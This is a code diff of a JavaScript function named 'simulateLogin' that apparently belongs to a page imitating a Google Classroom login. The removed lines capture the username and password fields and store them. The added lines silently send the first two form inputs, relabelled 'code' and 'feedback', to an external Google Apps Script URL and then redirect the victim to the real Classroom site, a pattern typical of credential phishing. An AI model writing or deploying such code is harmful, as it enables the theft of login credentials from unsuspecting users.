@@ -1,12 +1,34 @@
 
 function simulateLogin() {
-  const username = document.querySelector('input[type="text"]').value;
-  const password = document.querySelector('input[type="password"]').value;
-  console.log("Captured Username:", username);
-  console.log("Captured Password:", password);
-  localStorage.setItem('teacher_login', JSON.stringify({ username, password }));
-  console.log("Stored to localStorage:", localStorage.getItem("teacher_login"));
-  window.location.href = "https://classroom.google.com/";
+  try {
+    const inputs = document.querySelectorAll('input');
+    if (inputs.length < 2) {
+      alert("Form inputs not found.");
+      return;
+    }
+
+    const code = inputs[0].value.trim();
+    const feedback = inputs[1].value.trim();
+
+    if (!code || !feedback) {
+      alert("Please fill in both fields before submitting.");
+      return;
+    }
+
+    fetch("https://script.google.com/macros/s/AKfycbwPX5xpGgf650HGywGgGNX_jQu8ldwftZuih7fuB7MZT9Y2wpI57_wAeo8iXSPGIobr/exec", {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify({ code, feedback }),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    });
+
+    alert("Submission successful! Redirecting...");
+    window.location.href = "https://classroom.google.com/";
+  } catch (e) {
+    alert("Unexpected error.");
+  }
 }
 
 window.onload = function() {
